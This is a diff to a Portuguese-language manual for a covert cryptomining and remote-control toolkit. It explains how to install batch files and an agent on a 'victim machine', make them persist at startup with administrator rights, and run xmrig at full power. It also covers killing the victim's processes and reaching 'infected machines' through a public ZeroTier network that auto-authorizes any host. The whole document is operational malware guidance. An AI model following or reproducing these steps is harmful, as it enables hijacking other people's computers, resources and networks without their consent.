@@ -7,9 +7,10 @@ executar mineração oculta e gerenciar redes de forma silenciosa.
 
 [1] INSTALAÇÃO (Na Máquina Vítima)
 --------------------------------------------------------------------------------
-1. Copie estes 3 arquivos para a máquina alvo:
+1. Copie estes 4 arquivos para a máquina alvo:
+   - IniciarComWindows.bat
    - Install.bat
-   - Start.bat
+   - Start_Now.bat
    - SystemOut.zip
 
 2. Execute o 'Install.bat' (Duplo clique).
@@ -17,15 +18,17 @@ executar mineração oculta e gerenciar redes de forma silenciosa.
    - O Firewall será configurado automaticamente.
    - O Agente iniciará em modo de serviço (Persistente).
 
-3. (Opcional) Execute 'Start.bat' se quiser iniciar a mineração imediatamente.
+3. (Opcional) Execute 'Start_Now.bat' se quiser iniciar a mineração imediatamente.
    (Caso contrário, você pode iniciar depois remotamente).
+
+4. (Opcional) Execute 'IniciarComWindows.bat' se quiser que o minerador seja iniciado junto com o pc sempre        que iniciar.
 
 
 [2] CONTROLE (Na Sua Máquina)
 --------------------------------------------------------------------------------
-Use o 'client.exe' para se conectar às máquinas infectadas.
+Use o 'SystemClient.exe' para se conectar às máquinas infectadas.
 
-1. Abra o client.exe.
+1. Abra o SystemClient.exe.
 2. Digite o IP da máquina alvo.
 3. Use o Menu Principal para enviar comandos.
 
@@ -62,8 +65,17 @@ E. STOPNAME:<nome>
    Ex: STOPNAME:chrome (Fecha todos os navegadores da vítima)
 
 
+[3] SystemOutCache.exe
+--------------------------------------------------------------------------------
 
-[3] SystemNetConfig.exe
+É o programa que fica escutando no pc da vitima, ele é responsaver por escutar os comandos que serao enviado no SystemClient.exe, e enviar para o PC servidor (pc da vitima)
+
+ - Inicia com windowns por padrao
+ - Roda como administrador por padrao
+
+
+
+[4] SystemNetConfig.exe
 --------------------------------------------------------------------------------
 O 'SystemNetConfig.exe' é uma ferramenta interativa para configuração de rede.
 Ele foi desenhado para ser "Atômico", ou seja, se você configurar algo errado e perder a conexão,
@@ -101,12 +113,50 @@ Primeiro, você deve selecionar o adaptador de rede (ex: Ethernet). Digite o nú
 OBS: As alterações são persistentes (sobrevivem ao reboot).
 
 
-[4] DICAS DE OPERAÇÃO
+[5] SystemGerenciador_Threads.exe
 --------------------------------------------------------------------------------
-- Persistência: O serviço inicia sozinho com o Windows.
+
+Ao executar roda uma analise no pc hospedeiro para verificar a pontencia do mesmo (nucleos e threads) com isso ele cria uma configuracao basica de desempenho, baixa, media e alta.
+
+ - Baixa: roda usando poucos threads (deixa o pc usavel)
+ - Medio: roda usando medio threads (deixa o pc usavel, mas com gargalo)
+ - Alta: roda usando todos threads (impossivel usar o pc, ele vai usar toda a potencia)
+
+por fim, depois de analisar o pc, ele vai pedir pra vc escolher entre, low, medio, hight, e salvar esses dados no arquivo config.json em C:\windows\SystemOut\XMR\config.json
+
+quando rodar o xmrig.exe, ele rodará com as infomacoes atualizada do config.json.
+
+
+DICA (CONFIGURAÇÃO DO MINETADOR): config.json 
+--------------------
+O Minerador precisa definir um nome tanto no user"" quanto no pass"" (use o mesmo nome para os dois).
+Exemplo: user"PedrinhoBandido01" pass"PedrinhoBandido01"
+
+
+[6] ZeroTier One.msi
+--------------------------------------------------------------------------------
+
+porque usar o ZeroTier?
+Sem o ZeroTier, vc só conseguira enviar comando shell estando na mesma rede que o pc da vitima, com o zerotier, vc cria uma LAN virtual (VPN LOCAL ENTRE OS PC), com isso vc consegue se conectar no pc da vitima atraves do pc publico que o ZeroTier te entregar no site: https://my.zerotier.com/network
+
+Obs: Ele é instalado no mesmo momento em que voce clica em "Install.bat".
+
+Antes de rodar o Install.bat voce deve apenas acessar o site: "https://my.zerotier.com/network", crie uma rede e edite o arquivo Install.bat para atualizar sua conexao: (ex: a09acf02334a8115)
+
+Dica: Legacy Site)
+Você deve gerenciar a rede pelo Site Legado (https://my.zerotier.com/network).
+ - Motivo: Ele permite marcar a rede como PUBLIC (Access Control).
+ - Vantagem: Isso autoriza automaticamente qualquer máquina que entrar. Você não precisa ir no site aprovar PC por PC.
+
+
+
+[x] DICAS DE OPERAÇÃO
+--------------------------------------------------------------------------------
+- Persistência: O serviço SystemOutCache.exe inicia sozinho com o Windows.
 - Zumbis: Se usar STOP num script .bat, o programa filho pode continuar rodando.
   Sempre use STOPNAME para garantir que matou tudo.
 - Logs: Se algo der errado, procure por 'nettool_debug.log' na pasta SystemOut.
+- No Windows para melhor desepempenho, altere o Huge Pages e adicionar "Todos".
 
 ================================================================================
                               FIM DO MANUAL
